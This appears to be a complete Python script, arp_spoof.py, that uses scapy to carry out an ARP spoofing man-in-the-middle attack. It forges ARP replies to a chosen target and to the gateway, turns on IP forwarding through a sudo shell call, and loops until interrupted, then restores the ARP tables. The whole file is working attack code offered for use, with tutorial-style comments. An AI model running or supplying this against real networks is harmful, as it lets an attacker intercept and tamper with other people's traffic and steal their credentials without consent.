#!/usr/bin/env python3

import time
import sys
import subprocess
from argparse import ArgumentParser
import scapy.all as scapy

if sys.version_info < (3, 0):
    sys.stderr.write("\nYou need python 3.0 or later to run this script\n")
    sys.stderr.write(
        "Please update and make sure you use the command python3 arp_spoof.py -t <target_ip> -g <gateway_ip>\n\n")
    sys.exit(0)


def args():
    parser = ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_address", help="Specify the IP address for your target device. "
                                                                      "Example: --target 192.168.1.7")
    parser.add_argument("-g", "--gateway", dest="gateway_address",
                        help="Specify the IP address of the gateway to spoof. Example: --gateway 192.168.1.1")
    options = parser.parse_args()
    if not options.target_address:
        parser.error("[-] Please specify the target IP address, or type it correctly, ex: -t 192.168.1.8")
    elif not options.gateway_address:
        parser.error("[-] Please specify the gateway IP address, or type it correctly, ex: -g 192.168.1.1")
    return options


def fetch_mac_address(ip_address):
    arp_request = scapy.ARP(pdst=ip_address)  # create an ARP request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # broadcast an ARP packets to all devices in the network
    broadcast_arp_packets = broadcast / arp_request  # combining these 2 packets together to send

    ans, unans = scapy.srp(broadcast_arp_packets, timeout=2, verbose=False)  # send packets to all devices
    return ans[0][1].hwsrc  # return only the mac address of the target


def spoof(target_ip, spoof_ip):
    target_mac_address = fetch_mac_address(ip_address=target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address,
                             psrc=spoof_ip)  # op=2 telling scapy to send ARP response, pdst=<target_ip>,
    # hwdst=<target_mac>, psrc=<gateway_ip> (false information)
    scapy.send(arp_response, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac_address = fetch_mac_address(ip_address=destination_ip)
    source_mac_address = fetch_mac_address(ip_address=source_ip)
    arp_response = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac_address, psrc=source_ip,
                             hwsrc=source_mac_address)
    scapy.send(arp_response, verbose=False, count=4)  # count=4 sent this packet 4 times


option = args()
target_ip_address = option.target_address
gateway_ip_address = option.gateway_address

packets_counter = 0
try:
    subprocess.call("sudo echo 1 > /proc/sys/net/ipv4/ip_forward",
                    shell=True)  # allow the packets to flow through our machine (security feature in kali linux)
    while True:
        spoof(target_ip=target_ip_address, spoof_ip=gateway_ip_address)  # first packet goes to the client
        spoof(target_ip=gateway_ip_address, spoof_ip=target_ip_address)  # second packet goes to the router
        packets_counter += 2
        print("\r[+] Sent " + str(packets_counter) + " Spoofed Packets.", end='')
        time.sleep(1.7)
except KeyboardInterrupt:
    print("\n[*] Detected 'ctrl + c' pressed, program terminated.")
    print("[*] Cleaning up and re-arping targets...\n")
    for _ in range(3):
        restore(destination_ip=target_ip_address, source_ip=gateway_ip_address)
